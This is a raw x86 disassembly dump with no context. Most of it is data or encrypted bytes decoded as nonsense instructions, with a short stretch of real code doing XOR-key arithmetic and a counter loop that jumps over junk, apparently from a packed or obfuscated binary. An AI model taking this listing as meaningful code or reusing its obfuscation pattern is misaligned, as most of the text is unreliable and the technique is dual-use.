  4088ff:	hlt    
  408900:	jp     0x408905
  408902:	pminsw mm3,QWORD PTR [ebx+ebp*4-0x10934f6a]
  40890a:	dec    esp
  40890b:	out    dx,eax
  40890c:	pop    edi
  40890d:	or     al,BYTE PTR [eax+0x69]
  408910:	inc    esp
  408911:	jnp    0x40894e
  408913:	fcomp  DWORD PTR [edi]
  408915:	pop    esp
  408916:	cmp    ch,BYTE PTR [ebp+esi*4+0x133c1a03]
  40891d:	mov    dl,0xa2
  40891f:	cld    
  408920:	sar    DWORD PTR [eax+0x173a2b05],cl
  408926:	pusha  
  408927:	mov    ecx,0x888e9e77
  40892c:	and    al,0xbb
  40892e:	call   0x5682:0x75c0
  408934:	ficomp DWORD PTR [ebp+eiz*2-0x47]
  408938:	inc    esi
  408939:	cdq    
  40893a:	or     eax,0x83f708ed
  40893f:	test   BYTE PTR [edx+0x6e2b0ffa],0xef
  408946:	popa   
  408947:	jmp    0x6991565
  40894c:	cmp    esp,DWORD PTR [esi-0x71]
  40894f:	(bad)  
  408950:	push   ds
  408951:	dec    ecx
  408952:	dec    esi
  408953:	ins    BYTE PTR es:[edi],dx
  408954:	pop    ecx
  408955:	in     al,dx
  408956:	mov    ?,WORD PTR [esi-0x54]
  408959:	mov    ds:0x8abe4fb2,eax
  40895e:	cmp    al,0xeb
  408960:	repz loope 0x408962
  408963:	add    ecx,DWORD PTR [ecx-0x29f1d404]
  408969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40896a:	cmc    
  40896b:	jb     0x4089d0
  40896d:	push   0x79
  40896f:	mov    eax,0x90e94309
  408974:	lea    ecx,[ebx+0x3]
  408977:	sbb    ah,BYTE PTR [eax]
  408979:	jbe    0x40894a
  40897b:	or     al,0x4e
  40897d:	je     0x408957
  40897f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408980:	or     BYTE PTR [ebx+edx*1+0xf],al
  408984:	jb     0x4089ec
  408986:	(bad)  
  408987:	(bad)  
  408988:	cmp    DWORD PTR [esi-0x16],edx
  40898b:	ss sub al,0x4c
  40898e:	or     esp,DWORD PTR [edx+0x5fb1f686]
  408994:	(bad)  [ebp-0x77ee7327]
  40899a:	loope  0x40896d
  40899c:	loop   0x408966
  40899e:	sbb    eax,0xc0ab00aa
  4089a3:	adc    BYTE PTR [edx],dl
  4089a5:	mov    dl,0x4b
  4089a7:	cli    
  4089a8:	cmc    
  4089a9:	xchg   esp,eax
  4089aa:	inc    esp
  4089ab:	lods   eax,DWORD PTR ds:[esi]
  4089ac:	bnd jo 0x408a01
  4089af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089b0:	outs   dx,DWORD PTR ds:[esi]
  4089b1:	jmp    0xb070:0x8f17292f
  4089b8:	mov    ecx,0xbb10dde7
  4089bd:	adc    al,0xe3
  4089bf:	dec    esp
  4089c0:	add    cl,dh
  4089c2:	out    0x33,eax
  4089c4:	addr16 jbe 0x408a0a
  4089c7:	mov    bh,0xb
  4089c9:	sub    al,0xed
  4089cb:	dec    ebx
  4089cc:	fcomp  QWORD PTR [esi-0x3c]
  4089cf:	sub    dl,BYTE PTR [ebx]
  4089d1:	fdiv   QWORD PTR [ebx]
  4089d3:	or     eax,0x34dcffd
  4089d8:	add    BYTE PTR [eax*1-0xd67a6ba],dl
  4089df:	sub    al,0x14
  4089e1:	fcmovu st,st(0)
  4089e3:	mov    cl,BYTE PTR [ebp-0x1a]
  4089e6:	aaa    
  4089e7:	add    ecx,edx
  4089e9:	loopne 0x40896c
  4089eb:	adc    DWORD PTR [esi],ebx
  4089ed:	or     eax,0xcfe437c4
  4089f2:	push   ss
  4089f3:	push   eax
  4089f4:	push   es
  4089f5:	pop    esi
  4089f6:	dec    ebp
  4089f7:	mov    dl,0xe1
  4089f9:	jo     0x4089e4
  4089fb:	in     eax,0x6d
  4089fd:	test   BYTE PTR [ebp-0x290139c9],dh
  408a03:	push   es
  408a04:	push   esp
  408a05:	mov    ch,bl
  408a07:	jns    0x408a60
  408a09:	pusha  
  408a0a:	jbe    0x408a04
  408a0c:	mov    ebp,0x52830e3a
  408a11:	push   eax
  408a12:	(bad)  
  408a13:	clc    
  408a14:	gs mov ebp,0x30fc24dc
  408a1a:	nop
  408a1b:	ret    
  408a1c:	push   eax
  408a1d:	pop    ecx
  408a1e:	sub    BYTE PTR [edx+0x25604131],0x1a
  408a25:	or     DWORD PTR [edi-0x7b],edx
  408a28:	aas    
  408a29:	sbb    ch,cl
  408a2b:	mov    ?,edx
  408a2d:	shr    DWORD PTR [edi+0x22868b6a],0xeb
  408a34:	sub    esp,DWORD PTR fs:[eax]
  408a37:	call   0xf37bf70
  408a3c:	out    0xb3,eax
  408a3e:	neg    DWORD PTR [ebx+ebp*4]
  408a41:	xchg   DWORD PTR [eax],edx
  408a43:	mov    BYTE PTR [edi],0xbc
  408a46:	int    0x4c
  408a48:	or     eax,0xea762ffc
  408a4d:	sub    eax,0x73ea5887
  408a52:	popf   
  408a53:	scas   eax,DWORD PTR es:[edi]
  408a54:	jle    0x408a03
  408a56:	cmp    al,0xe2
  408a58:	inc    eax
  408a59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a5a:	ret    0x14c5
  408a5d:	je     0x408a6a
  408a5f:	js     0x408a9a
  408a61:	mov    WORD PTR ds:0x382bfde3,gs
  408a67:	loop   0x408a1e
  408a69:	fild   DWORD PTR [esi+0x27]
  408a6c:	test   edi,esp
  408a6e:	cld    
  408a6f:	mov    DWORD PTR [ecx],eax
  408a71:	pop    esi
  408a72:	leave  
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0xf4b3a4f9
  408a92:	inc    esi
  408a93:	pop    edx
  408a94:	out    dx,al
  408a95:	cmp    ah,ah
  408a97:	js     0x408b11
  408a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9a:	jle    0x408b14
  408a9c:	js     0x408aa8
  408a9e:	and    dh,BYTE PTR [ebp-0x35]
  408aa1:	je     0x408ad2
  408aa3:	jo     0x408a7e
  408aa5:	and    al,0x3
  408aa7:	test   ch,dl
  408aa9:	ins    DWORD PTR es:[edi],dx
  408aaa:	(bad)  
  408aab:	retf   
  408aac:	arpl   WORD PTR [ebp+0x7d],dx
  408aaf:	enter  0x1229,0xe5
  408ab3:	cmp    edx,DWORD PTR [edx-0x2c]
  408ab6:	dec    ebp
  408ab7:	dec    ecx
  408ab8:	dec    edx
  408ab9:	sub    eax,DWORD PTR [esi]
  408abb:	add    BYTE PTR [eax],0x58
  408abe:	push   ds
  408abf:	jo     0x408a8a
  408ac1:	sub    ch,BYTE PTR [ebp+0x74]
  408ac4:	dec    esi
  408ac5:	xchg   ebp,eax
  408ac6:	push   ecx
  408ac7:	jb     0x408a88
  408ac9:	retf   0xe66f
  408acc:	test   DWORD PTR [eax],ebx
  408ace:	nop
  408acf:	imul   ecx,DWORD PTR [edi],0x6e
  408ad2:	pop    esp
  408ad3:	test   BYTE PTR [eax+0x63d93494],cl
  408ad9:	cs mov edi,0x75b56517
  408adf:	fdivr  st,st(4)
  408ae1:	cdq    
  408ae2:	add    eax,0x19f8cc88
  408ae7:	mov    BYTE PTR [ecx-0x6c],0xb2
  408aeb:	out    dx,al
  408aec:	in     eax,0x61
  408aee:	add    DWORD PTR [ebx],edi
  408af0:	add    ecx,ebp
  408af2:	push   ss
  408af3:	pop    ss
  408af4:	mov    eax,0xfe568857
  408af9:	fwait
  408afa:	test   al,0x8
  408afc:	out    dx,al
  408afd:	cmp    ah,al
  408aff:	ret    0xaee8
  408b02:	dec    edx
  408b03:	jb     0x408b34
  408b05:	shr    cl,1
  408b07:	push   ds
  408b08:	sbb    BYTE PTR [esi+0x1d],bl
  408b0b:	xlat   BYTE PTR ds:[ebx]
  408b0c:	and    bl,dh
  408b0e:	inc    edx
  408b0f:	push   ebx
  408b10:	out    dx,al
  408b11:	icebp  
  408b12:	or     eax,0xc82fb0b7
  408b17:	add    ecx,DWORD PTR [eax]
  408b19:	mov    ebp,0x14aff280
  408b1e:	cdq    
  408b1f:	mov    ch,0x49
  408b21:	jno    0x408af1
  408b23:	test   BYTE PTR [ebx],al
  408b25:	adc    DWORD PTR [eax-0x58f12bfb],ebx
  408b2b:	out    0xa6,eax
  408b2d:	inc    eax
  408b2e:	push   ebx
  408b2f:	les    edx,FWORD PTR [ecx+0x6534dcb5]
  408b35:	fimul  WORD PTR [ecx+0xe]
  408b38:	add    ebx,DWORD PTR [ebx+0x6c14a00c]
  408b3e:	fmul   DWORD PTR [ecx+0x8]
  408b41:	pop    eax
  408b42:	cmp    BYTE PTR [ebx],ch
  408b44:	ins    DWORD PTR es:[edi],dx
  408b45:	mov    ds:0x8fbd1fb2,al
  408b4a:	mov    al,ds:0xd213a14f
  408b4f:	sti    
  408b50:	in     al,dx
  408b51:	and    eax,DWORD PTR [ecx-0x5]
  408b54:	or     dl,ch
  408b56:	(bad)  
  408b57:	and    eax,0x77ad8558
  408b5c:	cdq    
  408b5d:	dec    ebx
  408b5e:	adc    edi,DWORD PTR [edi]
  408b60:	loop   0x408b56
  408b62:	mov    edi,0x7efe0070
  408b67:	dec    eax
  408b68:	ret    
  408b69:	push   ecx
  408b6a:	sahf   
  408b6b:	inc    ebx
  408b6c:	cmp    al,0xc7
  408b6e:	(bad)  
  408b6f:	sbb    ebx,DWORD PTR [ebp+0x38c478f8]
  408b75:	ss mov cl,0x7c
  408b78:	je     0x408b07
  408b7a:	inc    esp
  408b7b:	repnz cld 
  408b7d:	push   0x5df94711
  408b82:	push   eax
  408b83:	push   esi
  408b84:	push   es
  408b85:	shl    DWORD PTR [ebp-0x2be15b45],cl
  408b8b:	or     BYTE PTR [ebx+0x23e56fd0],ah
  408b91:	pushf  
  408b92:	scas   eax,DWORD PTR es:[edi]
  408b93:	in     al,0x9d
  408b95:	imul   esp,DWORD PTR [edx+0xf3f6d28],0xffffff98
  408b9c:	sti    
  408b9d:	xchg   DWORD PTR [ebp-0x4f],ecx
  408ba0:	fidiv  DWORD PTR [ebp+0x5a]
  408ba3:	cmp    al,0x1f
  408ba5:	mov    ch,0x49
  408ba7:	sub    dl,BYTE PTR [edx+0x7a]
  408baa:	mov    al,0x22
  408bac:	lods   al,BYTE PTR ds:[esi]
  408bad:	xor    DWORD PTR [eax+0x1a],esi
  408bb0:	dec    ebp
  408bb1:	ror    DWORD PTR [ebp+0x4d],0xcb
  408bb5:	mov    bh,0xeb
  408bb7:	leave  
  408bb8:	rol    ebp,0xeb
  408bbb:	jl     0x408b86
  408bbd:	lds    esp,FWORD PTR [ebx]
  408bbf:	retf   0x687b
  408bc2:	sub    eax,eax
  408bc4:	cmp    eax,0x36
  408bc7:	mov    edx,ss
  408bc9:	scas   eax,DWORD PTR es:[edi]
  408bca:	add    ecx,ecx
  408bcc:	push   esp
  408bcd:	fdivr  DWORD PTR ds:0xec37fb0d
  408bd3:	in     al,dx
  408bd4:	sahf   
  408bd5:	mov    bl,0x2f
  408bd7:	cmp    dh,BYTE PTR [eax+0x13]
  408bda:	dec    esp
  408bdb:	xchg   ebp,eax
  408bdc:	pop    ecx
  408bdd:	ret    
  408bde:	das    
  408bdf:	mov    dh,0x91
  408be1:	sub    al,0xa6
  408be3:	test   eax,0x11aaa7d9
  408be8:	js     0x408b7f
  408bea:	cli    
  408beb:	nop
  408bec:	mov    BYTE PTR [ebp+0x6e],dl
  408bef:	or     edx,edx
  408bf1:	add    esi,esp
  408bf3:	fld    st(6)
  408bf5:	push   eax
  408bf6:	mov    DWORD PTR ds:0x177e0db7,ebp
  408bfc:	data16 fcomip st,st(4)
  408bff:	xchg   esi,eax
  408c00:	jge    0x408b8c
  408c02:	xor    ebx,DWORD PTR [edx]
  408c04:	rol    DWORD PTR [ecx-0x42],1
  408c07:	xchg   DWORD PTR [ebx+0xd92ebc0],esi
  408c0d:	in     al,0xc7
  408c0f:	aaa    
  408c10:	lds    edx,FWORD PTR [esi-0x5f]
  408c13:	pushf  
  408c14:	add    BYTE PTR [ebp-0x77418cd8],ah
  408c1a:	and    dl,BYTE PTR [edi-0x5d]
  408c1d:	daa    
  408c1e:	jae    0x408c3c
  408c20:	fs in  eax,0x2b
  408c23:	push   0x2
  408c25:	mov    ds:0x63219c55,eax
  408c2a:	jnp    0x408bb8
  408c2c:	popf   
  408c2d:	mov    al,ds:0x2e91b713
  408c32:	add    BYTE PTR [ebx+0x57],al
  408c35:	call   0x8786:0x2eb7f8bd
  408c3c:	aas    
  408c3d:	ds mov esp,0x56e214ba
  408c43:	(bad)  
  408c44:	pop    edi
  408c45:	outs   dx,BYTE PTR ds:[esi]
  408c46:	dec    ecx
  408c47:	push   esp
  408c48:	imul   edi
  408c4a:	cld    
  408c4b:	sahf   
  408c4c:	adc    dl,BYTE PTR [edx]
  408c4e:	mov    ecx,0x7b5baaeb
  408c53:	es jmp 0x408ca3
  408c56:	adc    esp,0xffffffef
  408c59:	mov    edi,0xe205dcc3
  408c5e:	call   0x543e:0x97c8b7fa
  408c65:	repnz out 0xee,eax
  408c68:	aad    0x83
  408c6a:	loop   0x408cdf
  408c6c:	gs shr dh,1
  408c6f:	int3   
  408c70:	sub    al,0x34
  408c72:	in     al,0xf0
  408c74:	out    0xe9,al
  408c76:	dec    esi
  408c77:	sbb    al,0xf3
  408c79:	mov    bl,0xa0
  408c7b:	cmp    al,0x2c
  408c7d:	in     eax,dx
  408c7e:	addr16 mov ebp,0xf247c883
  408c84:	scas   eax,DWORD PTR es:[edi]
  408c85:	push   ebx
  408c86:	in     eax,0xd7
  408c88:	jno    0x408c1f
  408c8a:	xchg   esp,eax
  408c8b:	je     0x408c96
  408c8d:	inc    esp
  408c8e:	daa    
  408c8f:	les    eax,FWORD PTR [ecx-0x6ac1d437]
  408c95:	popa   
  408c96:	ror    ebp,1
  408c98:	xchg   ecx,eax
  408c99:	push   0x389dc0c5
  408c9e:	jns    0x408ce1
  408ca0:	fmul   DWORD PTR [edx-0x7b]
  408ca3:	outs   dx,BYTE PTR ds:[esi]
  408ca4:	bound  ecx,QWORD PTR ds:0x84c765b0
  408caa:	pushf  
  408cab:	mov    eax,0x85de481d
  408cb0:	shl    BYTE PTR [eax+0x6f892eaf],cl
  408cb6:	push   ebp
  408cb7:	aas    
  408cb8:	lea    edi,[eax-0x1fc83439]
  408cbe:	pop    ebx
  408cbf:	js     0x408cbe
  408cc1:	push   ebx
  408cc2:	into   
  408cc3:	add    eax,0xd4744bd3
  408cc8:	call   0x761251af
  408ccd:	ins    DWORD PTR es:[edi],dx
  408cce:	adc    al,0x38
  408cd0:	sar    esp,0xb2
  408cd3:	jecxz  0x408c5e
  408cd5:	cmp    eax,0x88d29c91
  408cda:	xchg   esp,eax
  408cdb:	js     0x408c99
  408cdd:	pushf  
  408cde:	aaa    
  408cdf:	ret    
  408ce0:	iret   
  408ce1:	enter  0x3235,0xfe
  408ce5:	inc    edi
  408ce6:	sahf   
  408ce7:	and    esp,DWORD PTR [ebp-0x610027f2]
  408ced:	fcom   QWORD PTR [edi+0x7c]
  408cf0:	pushf  
  408cf1:	sub    al,0x25
  408cf3:	jnp    0x408d4d
  408cf5:	adc    DWORD PTR [edi-0x45],edx
  408cf8:	hlt    
  408cf9:	fdivr  DWORD PTR [edx]
  408cfb:	fdivr  st,st(6)
  408cfd:	sbb    BYTE PTR [ebp-0x5a],ch
  408d00:	dec    eax
  408d01:	mov    DWORD PTR [esi-0x1],edx
  408d04:	pop    edi
  408d05:	mov    cl,0xcc
  408d07:	add    al,0x3f
  408d09:	lods   al,BYTE PTR ds:[esi]
  408d0a:	cmp    ecx,edx
  408d0c:	test   ecx,ebx
  408d0e:	jmp    DWORD PTR [edx-0x65]
  408d11:	out    0x4,eax
  408d13:	sub    edi,ebx
  408d15:	xchg   BYTE PTR [esi+0x6],ch
  408d18:	jbe    0x408cbc
  408d1a:	cdq    
  408d1b:	inc    edx
  408d1c:	clc    
  408d1d:	sbb    edx,DWORD PTR [eax+ebp*4-0x2f]
  408d21:	imul   ecx,DWORD PTR [esi-0x1e032ee9],0x4d
  408d28:	dec    edi
  408d29:	push   cs
  408d2a:	dec    eax
  408d2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d2c:	ss ret 0x555c
  408d30:	push   ebp
  408d31:	inc    ecx
  408d32:	fldlg2 
  408d34:	stc    
  408d35:	cmp    DWORD PTR [ebp+esi*2+0x75],edi
  408d39:	into   
  408d3a:	nop
  408d3b:	clc    
  408d3c:	or     BYTE PTR [ecx+ebx*1],bh
  408d3f:	add    bl,0xb5
  408d42:	sti    
  408d43:	(bad)  
  408d44:	inc    ebx
  408d45:	push   edx
  408d46:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  408d4d:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  408d54:	mov    eax,DWORD PTR [ebp-0x4]
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42a88d
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42a8ad,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42a7e1,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42a7e1
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42a7e1,ecx
  408d90:	cmp    DWORD PTR ds:0x42a7e1,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42a7e1,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42a7e1,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42a7e1
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42a7e1,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42a815
  408ddc:	xor    ecx,DWORD PTR ds:0x42a7dd
  408de2:	mov    DWORD PTR ds:0x42a815,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42a829,0x42a785
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a79d,0x42a819
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0xfffffffb
  408e1d:	adc    ebp,DWORD PTR [edi]
  408e1f:	stos   BYTE PTR es:[edi],al
  408e20:	addr16 jmp 0x7878:0x7ea77878
  408e28:	fucomi st,st(6)
  408e2a:	jne    0x408e11
  408e2c:	jne    0x408e79
  408e2e:	or     al,0xb2
  408e30:	cli    
  408e31:	inc    ecx
  408e32:	repz push eax
  408e35:	sahf   
  408e36:	push   ss
  408e37:	fs loopne 0x408ea1
  408e3a:	inc    esi
  408e3b:	shl    BYTE PTR [eax+0x1b],cl
  408e3e:	or     al,0x7a
  408e40:	inc    ebx
  408e41:	int    0x8e
  408e43:	xchg   edx,eax
  408e44:	in     al,dx
  408e45:	out    0xde,al
  408e47:	cmp    al,0x10
  408e49:	jl     0x408e88
  408e4b:	ret    
  408e4c:	pushf  
  408e4d:	push   edx
  408e4e:	outs   dx,BYTE PTR ds:[esi]
  408e4f:	lods   al,BYTE PTR ds:[esi]
  408e50:	mov    ch,0x9f
  408e52:	pusha  
  408e53:	dec    edi
  408e54:	ret    0xc7c3
  408e57:	out    dx,eax
  408e58:	push   esi
  408e59:	xchg   ecx,eax
  408e5a:	or     dl,BYTE PTR [ecx+0x4]
  408e5d:	xchg   edx,eax
  408e5e:	dec    esp
  408e5f:	popa   
  408e60:	mov    ds:0x1c35d710,al
  408e65:	or     eax,0xde9f0310
  408e6a:	mov    ch,0xfe
  408e6c:	mov    ah,0xab
  408e6e:	cld    
  408e6f:	lods   eax,DWORD PTR ds:[esi]
  408e70:	stc    
  408e71:	push   ecx
  408e72:	mov    eax,ds:0xf555e7a8
  408e77:	rcr    eax,1
  408e79:	add    BYTE PTR ds:0x5a62cf41,0x29
  408e80:	ret    
  408e81:	jl     0x408e74
  408e83:	sbb    ch,BYTE PTR ds:0x59f09de3
  408e89:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  408e8b:	xlat   BYTE PTR ds:[ebx]
  408e8c:	jbe    0x408ee8
  408e8e:	sbb    ebx,edi
  408e90:	imul   ecx,DWORD PTR [eax],0xfffffff0
  408e93:	adc    eax,0xbfc62527
  408e98:	xor    eax,0xc56038c7
  408e9d:	mov    eax,0x9a60e9c0
  408ea2:	adc    al,BYTE PTR ds:0x9090e464
  408ea8:	pop    edi
  408ea9:	and    dh,BYTE PTR [eax-0x154922a6]
  408eaf:	sub    al,0x32
  408eb1:	sbb    eax,0x516bc1b6
  408eb6:	mov    bh,0x8c
  408eb8:	adc    eax,0xb859a6b3
  408ebe:	sti    
  408ebf:	or     esp,DWORD PTR [ecx-0x31a80e00]
  408ec5:	inc    esi
  408ec6:	sbb    BYTE PTR [edx],0x13
  408ec9:	out    dx,al
  408eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ecb:	cmc    
  408ecc:	rcr    BYTE PTR [edx+0x74],1
  408ecf:	das    
  408ed0:	or     bl,BYTE PTR [edx+edi*2]
  408ed3:	xor    DWORD PTR cs:[ecx+0x288b8492],edi
  408eda:	sti    
  408edb:	enter  0x5f69,0x3d
  408edf:	mov    ch,0xd0
  408ee1:	jne    0x408ea4
  408ee3:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  408ee5:	and    ecx,DWORD PTR [edx+0x4e]
  408ee8:	bound  esi,QWORD PTR [ebx+0x310f4e6c]
  408eee:	xchg   cl,bh
  408ef0:	jecxz  0x408f4e
  408ef2:	aad    0xe
  408ef4:	loope  0x408f37
  408ef6:	push   ss
  408ef7:	fdivr  st,st(5)
  408ef9:	mov    ah,0xe
  408efb:	les    esi,FWORD PTR [edx]
  408efd:	iret   
  408efe:	push   ds
  408eff:	inc    esp
  408f00:	mov    esi,0xafb0707d
  408f05:	jne    0x408e9b
  408f07:	test   eax,0x6dc58b24
  408f0c:	pop    ecx
  408f0d:	fdiv   DWORD PTR [ecx+0x73]
  408f10:	(bad)  
  408f11:	jg     0x408e93
  408f13:	adc    eax,DWORD PTR [esi-0x38]
  408f16:	pop    ebx
  408f17:	ds (bad) 
  408f19:	push   edx
  408f1a:	fcom   DWORD PTR [esi]
  408f1c:	out    0xb,eax
  408f1e:	ins    BYTE PTR es:[edi],dx
  408f1f:	leave  
  408f20:	mov    ebp,0xef80655a
  408f25:	pop    eax
  408f26:	mov    eax,ds:0x398edc2d
  408f2b:	and    al,0x74
  408f2d:	call   0x68499a19
  408f32:	sub    BYTE PTR [esi+0x76dc3695],bl
  408f38:	cmp    DWORD PTR [ecx],ebx
  408f3a:	retf   0x8cfb
  408f3d:	sti    
  408f3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f3f:	push   edi
  408f40:	mov    bh,BYTE PTR [ebx+0x68ecb0ff]
  408f46:	jmp    0xb168f9b3
  408f4b:	rol    DWORD PTR [eax-0x5ac47388],0x6b
  408f52:	jmp    0xe85f:0xf7594fcf
  408f59:	std    
  408f5a:	leave  
  408f5b:	add    dh,0xc3
  408f5e:	pusha  
  408f5f:	rcr    DWORD PTR [edi+0x30327878],0xb
  408f66:	mov    ebp,0x30b9185d
  408f6b:	or     BYTE PTR [esi-0x2e00e0bd],bh
  408f71:	(bad)  
  408f72:	addr16 es inc ecx
  408f75:	mov    dl,BYTE PTR [edx-0x2565effc]
  408f7b:	inc    esi
  408f7c:	jp     0x408fc5
  408f7e:	fdiv   QWORD PTR [eax+0x1e87334c]
  408f84:	jmp    0x52ae:0x3ee11515
  408f8b:	mov    cl,0x4b
  408f8d:	and    edi,esp
  408f8f:	xchg   ebx,eax
  408f90:	push   0x26fa1ff8
  408f95:	scas   eax,DWORD PTR es:[edi]
  408f96:	mov    eax,ds:0x3148ef95
  408f9b:	enter  0xd2c1,0xe
  408f9f:	fnstcw WORD PTR cs:[ecx-0x60]
  408fa3:	jp     0x408fdf
  408fa5:	fs cwde 
  408fa7:	fnstsw ax
  408fa9:	push   0x161bee31
  408fae:	popa   
  408faf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fb0:	out    dx,al
  408fb1:	call   0x3a617700
  408fb6:	mov    ch,0x77
  408fb8:	xor    esi,DWORD PTR [edx]
  408fba:	inc    esp
  408fbb:	and    DWORD PTR [ebp-0x2e993cf9],edx
  408fc1:	fwait
  408fc2:	xchg   esp,eax
  408fc3:	mov    ch,0x26
  408fc5:	repnz stos BYTE PTR es:[edi],al
  408fc7:	adc    BYTE PTR [ecx+ecx*8],dl
  408fca:	add    DWORD PTR [ebp-0x63],esi
  408fcd:	push   ss
  408fce:	mov    ds:0x2e576fe3,al
  408fd3:	mov    dh,0xf9
  408fd5:	in     al,0x4a
  408fd7:	lea    edx,[ebx-0x5c]
  408fda:	sbb    al,0xb3
  408fdc:	emms   
  408fde:	xor    esp,DWORD PTR [ecx+0x7998b9d0]
  408fe4:	lds    ebp,FWORD PTR [edi+0x14874fe1]
  408fea:	cmp    eax,0x542e8b42
  408fef:	fcomip st,st(0)
  408ff1:	mov    dl,BYTE PTR [edi]
  408ff3:	pop    es
  408ff4:	add    bl,BYTE PTR [edi-0xb8fbc15]
  408ffa:	(bad)  
  408ffc:	nop
  408ffd:	sub    DWORD PTR [edx+0x51],ecx
  409000:	sub    ebx,DWORD PTR [ecx]
  409002:	xor    bh,ah
  409004:	xor    dh,BYTE PTR [ecx]
  409006:	mov    ebp,0x484f197c
  40900b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40900c:	jl     0x408fc6
  40900e:	or     ecx,DWORD PTR [edi]
  409010:	and    BYTE PTR [edi+0x3d972b94],cl
  409016:	xchg   esp,eax
  409017:	mov    WORD PTR [edx+0x68c2f38e],ss
  40901d:	jecxz  0x40907d
  40901f:	sahf   
  409020:	push   edi
  409021:	in     al,dx
  409022:	cli    
  409023:	test   eax,0x44b74551
  409028:	repnz test eax,0x322b0987
  40902e:	mul    ch
  409030:	mov    cl,dl
  409032:	jns    0x4090af
  409034:	push   ecx
  409035:	xchg   esi,eax
  409036:	sbb    esi,edx
  409038:	adc    DWORD PTR [ecx+0x7f44edfb],edi
  40903e:	les    edi,FWORD PTR [edx]
  409040:	pop    ebp
  409041:	push   cs
  409042:	xor    DWORD PTR [edx+0x9],ebp
  409045:	jge    0x40909a
  409047:	outs   dx,DWORD PTR ds:[esi]
  409048:	(bad)  
  40904a:	xchg   esi,eax
  40904b:	adc    BYTE PTR [eax],bl
  40904d:	jbe    0x409004
  40904f:	xchg   ebx,eax
  409050:	lock clc 
  409052:	sub    BYTE PTR ds:0xc3dc7e07,ah
  409058:	mov    dl,0x66
  40905a:	ss mov ch,0x93
  40905d:	sahf   
  40905e:	xchg   edx,eax
  40905f:	retf   0x7ceb
  409062:	cli    
  409063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409064:	ffree  st(3)
  409066:	inc    ebx
  409067:	xor    BYTE PTR gs:[edx+0x69de2c70],cl
  40906e:	xchg   ecx,ecx
  409070:	es es cli 
  409073:	les    ebp,FWORD PTR [ebp+0x5836b3ea]
  409079:	(bad)  
  40907a:	fstp   TBYTE PTR ss:[ecx]
  40907d:	mov    ebp,0x8f249e06
  409082:	inc    esi
  409083:	jnp    0x4090c8
  409085:	fst    DWORD PTR [edi]
  409087:	mov    ebx,0xf0f5842c
  40908c:	mov    esp,0x239c0fb5
  409091:	out    dx,al
  409092:	xchg   edx,eax
  409093:	xor    BYTE PTR [ecx+0x34],bl
  409096:	stos   BYTE PTR es:[edi],al
  409097:	pushf  
  409098:	dec    ebx
  409099:	cmc    
  40909a:	ret    0xd892
  40909d:	arpl   WORD PTR [eax-0x78],bp
  4090a0:	shr    BYTE PTR [edx+0x501e5a4b],cl
  4090a6:	cwde   
  4090a7:	fild   DWORD PTR [esi]
  4090a9:	jge    0x4090b6
  4090ab:	adc    bl,ah
  4090ad:	cs ds rol esi,1
  4090b1:	das    
  4090b2:	(bad)  
  4090b3:	loopne 0x40903c
  4090b5:	pop    ecx
  4090b6:	retf   
  4090b7:	push   ecx
  4090b8:	jo     0x4090f1
  4090ba:	jo     0x409107
  4090bc:	lock aam 0x7a
  4090bf:	inc    ebp
  4090c0:	sub    ch,0xc9
  4090c3:	mov    es,WORD PTR [ebx-0x4c395b36]
  4090c9:	xor    eax,0x112e5f63
  4090ce:	sbb    DWORD PTR fs:[ebp+0x5c7f03b],esi
  4090d5:	and    DWORD PTR [eax+0x7b750042],ebp
  4090db:	add    BYTE PTR [eax],al
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0x70a4c6c4
  4090f5:	pusha  
  4090f6:	loopne 0x4090c3
  4090f8:	mov    gs,edi
  4090fa:	js     0x409174
